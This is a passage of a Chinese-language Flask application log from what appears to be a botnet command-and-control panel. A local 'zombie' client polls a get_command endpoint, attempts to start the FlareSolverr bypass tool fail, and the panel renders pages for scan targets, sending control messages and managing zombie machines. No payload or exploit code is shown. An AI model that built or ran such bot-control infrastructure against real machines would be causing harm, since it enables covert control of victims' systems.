document.getElementById(\'deleteModal\');\n        const deleteUrl = document.getElementById(\'delete-url\');\n        const deleteDomain = document.getElementById(\'delete-domain\');\n        const deleteForm = document.getElementById(\'deleteForm\');\n        \n        // 为每个删除按钮添加点击事件\n        deleteButtons.forEach(button => {\n            button.addEventListener(\'click\', function() {\n                const targetId = this.getAttribute(\'data-id\');\n                const targetUrl = this.getAttribute(\'data-url\');\n                const targetDomain = this.getAttribute(\'data-domain\');\n                \n                // 更新模态框内容\n                deleteUrl.textContent = targetUrl;\n                deleteDomain.textContent = targetDomain || \'未设置\';\n                \n                // 设置表单提交地址\n                deleteForm.action = `/delete_target/${targetId}`;\n                \n                // 显示模态框\n                const modal = new bootstrap.Modal(deleteModal);\n                modal.show();\n            });\n        });\n        \n        // 也可以添加AJAX方式删除\n        /*\n        deleteForm.addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            \n            const targetId = this.action.split(\'/\').pop();\n            \n            fetch(`/api/delete_target/${targetId}`, {\n                method: \'POST\'\n            })\n            .then(response => response.json())\n            .then(data => {\n                if (data.success) {\n                    // 关闭模态框\n                    bootstrap.Modal.getInstance(deleteModal).hide();\n                    // 刷新页面\n                    window.location.reload();\n                } else {\n                    alert(\'删除失败：\' + data.message);\n                }\n            })\n            .catch(error => {\n                console.error(\'Error:\', error);\n                alert(\'删除请求发送失败，请重试\');\n            });\n        });\n        */\n    });\n</script>\n\n</body>\n\n\n</html>'
2025-06-26 22:52:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:40] "GET / HTTP/1.1" 200 -
2025-06-26 22:52:40 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:40] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:52:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:52:41 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:52:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:52:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:52:41 | INFO     | flaresolverr_route.py:232 | flaresolverr_dashboard() | 載入 FlareSolverr 管理界面
2025-06-26 22:52:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:41] "GET /api/flaresolverr/dashboard HTTP/1.1" 200 -
2025-06-26 22:52:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:41] "GET /static/css/vulnerability/vulnerability.css HTTP/1.1" 200 -
2025-06-26 22:52:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:41] "GET /static/js/vulnerability.js HTTP/1.1" 200 -
2025-06-26 22:52:41 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:52:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:41] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:52:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:41] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:52:44 | INFO     | flaresolverr_route.py:104 | start_flaresolverr() | 收到啟動 FlareSolverr 服務請求
2025-06-26 22:52:44 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 22:52:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:52:46 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:52:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:52:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:52:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:53:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:53:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:53:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:53:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:53:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:53:12 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:53:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:53:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:53:14 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-26 22:53:14 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 22:53:14 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 38253)
2025-06-26 22:53:14 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 22:53:14 | ERROR    | flaresolverr_route.py:111 | start_flaresolverr() | FlareSolverr 服務啟動失敗: FlareSolverr 啟動超時
2025-06-26 22:53:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:53:14] "[35m[1mPOST /api/flaresolverr/start HTTP/1.1[0m" 500 -
2025-06-26 22:53:42 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:53:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:53:42] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:54:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:54:05 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:54:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:54:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:54:05] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:54:12 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:54:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:54:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:54:17 | INFO     | flaresolverr_route.py:104 | start_flaresolverr() | 收到啟動 FlareSolverr 服務請求
2025-06-26 22:54:17 | INFO     | start_flaresolverr.py:77 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-26 22:54:19 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:54:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:54:19] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:54:41 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:54:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:54:41] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:54:47 | ERROR    | start_flaresolverr.py:122 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-26 22:54:47 | INFO     | start_flaresolverr.py:249 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-26 22:54:47 | INFO     | start_flaresolverr.py:148 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 39765)
2025-06-26 22:54:47 | INFO     | start_flaresolverr.py:158 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-26 22:54:47 | ERROR    | flaresolverr_route.py:111 | start_flaresolverr() | FlareSolverr 服務啟動失敗: FlareSolverr 啟動超時
2025-06-26 22:54:47 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:54:47] "[35m[1mPOST /api/flaresolverr/start HTTP/1.1[0m" 500 -
2025-06-26 22:54:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:54:50 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:54:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:54:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:54:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:54:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:54:56 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:54:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:54:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:54:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:01 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:06 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:11 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:11 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:11 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:11 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:11] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:12 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:55:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:55:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:16 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:21 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:26 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0020s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:31 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0012s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:36 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:41 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:41 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:41 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:41 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:41] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:42 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:55:42 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:42] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:55:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:46 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:51 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:51 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:51 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:51 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:51] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:55:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:55:56 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:55:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:55:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:55:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:56:01 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:56:01 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:56:01 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:56:01 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:01] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:56:12 | INFO     | flaresolverr_route.py:179 | get_flaresolverr_status() | 收到獲取 FlareSolverr 狀態請求
2025-06-26 22:56:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:12] "GET /api/flaresolverr/status HTTP/1.1" 200 -
2025-06-26 22:56:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:56:20 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:56:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:56:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:56:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:56:26 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:56:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:56:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:56:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:56:31 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:56:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:56:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:56:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-26 22:56:36 | INFO     | control_route.py:167 | get_command() | 肉雞請求獲取命令
2025-06-26 22:56:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-26 22:56:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-26 22:56:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 index()
2025-06-26 22:56:36 | INFO     | index_routes.py:15 | index() | 用戶訪問首頁
2025-06-26 22:56:36 | INFO     | index_routes.py:18 | index() | 查詢到 0 個目標
2025-06-26 22:56:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] index 執行完畢 (耗時: 0.0009s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>扫描目标管理系统</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container mt-4">\n    \n        \n    \n\n    <div class="card shadow">\n        <div class="card-header bg-primary text-white d-flex justify-content-between align-items-center">\n            <h4 class="mb-0"><i class="fas fa-list"></i> 扫描目标列表</h4>\n            <a href="/add_target" class="btn btn-light">\n                <i class="fas fa-plus"></i> 添加新目标\n            </a>\n        </div>\n        <div class="card-body">\n            \n                <div class="alert alert-info mb-0">\n                    <i class="fas fa-info-circle"></i> 暂无扫描目标，请点击右上角"添加新目标"按钮添加\n                </div>\n            \n        </div>\n    </div>\n</div>\n\n<!-- 删除确认模态框 -->\n<div class="modal fade" id="deleteModal" tabindex="-1" aria-labelledby="deleteModalLabel" aria-hidden="true">\n    <div class="modal-dialog">\n        <div class="modal-content">\n            <div class="modal-header bg-danger text-white">\n                <h5 class="modal-title" id="deleteModalLabel"><i class="fas fa-exclamation-triangle"></i> 确认删除</h5>\n                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>\n            </div>\n            <div class="modal-body">\n                您确定要删除以下目标吗？<br>\n                <strong>URL: <span id="delete-url"></span></strong><br>\n                <strong>域名: <span id="delete-domain"></span></strong><br>\n                <small class="text-danger">* 此操作不可逆，删除后将无法恢复。</small>\n            </div>\n            <div class="modal-footer">\n                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">取消</button>\n                <form id="deleteForm" method="POST">\n                    <button type="submit" class="btn btn-danger">确认删除</button>\n                </form>\n            </div>\n        </div>\n    </div>\n</div>\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n<script>\n    // 删除目标功能\n    document.addEventListener(\'DOMContentLoaded\', function() {\n        // 获取所有删除按钮\n        const deleteButtons = document.querySelectorAll(\'.delete-target\');\n        const deleteModal = document.getElementById(\'deleteModal\');\n        const deleteUrl = document.getElementById(\'delete-url\');\n        const deleteDomain = document.getElementById(\'delete-domain\');\n        const deleteForm = document.getElementById(\'deleteForm\');\n        \n        // 为每个删除按钮添加点击事件\n        deleteButtons.forEach(button => {\n            button.addEventListener(\'click\', function() {\n                const targetId = this.getAttribute(\'data-id\');\n                const targetUrl = this.getAttribute(\'data-url\');\n                const targetDomain = this.getAttribute(\'data-domain\');\n                \n                // 更新模态框内容\n                deleteUrl.textContent = targetUrl;\n                deleteDomain.textContent = targetDomain || \'未设置\';\n                \n                // 设置表单提交地址\n                deleteForm.action = `/delete_target/${targetId}`;\n                \n                // 显示模态框\n                const modal = new bootstrap.Modal(deleteModal);\n                modal.show();\n            });\n        });\n        \n        // 也可以添加AJAX方式删除\n        /*\n        deleteForm.addEventListener(\'submit\', function(e) {\n            e.preventDefault();\n            \n            const targetId = this.action.split(\'/\').pop();\n            \n            fetch(`/api/delete_target/${targetId}`, {\n                method: \'POST\'\n            })\n            .then(response => response.json())\n            .then(data => {\n                if (data.success) {\n                    // 关闭模态框\n                    bootstrap.Modal.getInstance(deleteModal).hide();\n                    // 刷新页面\n                    window.location.reload();\n                } else {\n                    alert(\'删除失败：\' + data.message);\n                }\n            })\n            .catch(error => {\n                console.error(\'Error:\', error);\n                alert(\'删除请求发送失败，请重试\');\n            });\n        });\n        */\n    });\n</script>\n\n</body>\n\n\n</html>'
2025-06-26 22:56:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:36] "GET / HTTP/1.1" 200 -
2025-06-26 22:56:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [26/Jun/2025 22:56:36] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-26 22:56:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-26 22:56:38 | INFO     | control_route.py:84 | get_messages() | 用戶請求獲取消息
2025-06-26 22:56:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0007s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n\n\n<head>\n    <meta charset="UTF-8">\n    <meta name="viewport" content="width=device-width, initial-scale=1.0">\n    <title>控制消息</title>\n    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n    \n</head>\n\n<body>\n    <!-- 导航栏 -->\n    <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n        <div class="container">\n            <a class="navbar-brand" href="/">\n                <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n            </a>\n            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                <span class="navbar-toggler-icon"></span>\n            </button>\n            <div class="collapse navbar-collapse" id="navbarNav">\n                <ul class="navbar-nav ms-auto">\n                    <li class="nav-item">\n                        <a class="nav-link" href="/">\n                            <i class="fas fa-home"></i> 目标列表\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/add_target">\n                            <i class="fas fa-plus"></i> 添加目标\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/control/get_messages">\n                            <i class="fas fa-cog"></i> 控制消息\n                        </a>\n                    </li>\n                    <li class="nav-item">\n                        <a class="nav-link" href="/api/flaresolverr/dashboard">\n                            <i class="fas fa-cog"></i> FlareSolverr\n                        </a>\n                    </li>\n                </ul>\n            </div>\n        </div>\n    </nav>\n\n    \n    \n    \n\n    \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div 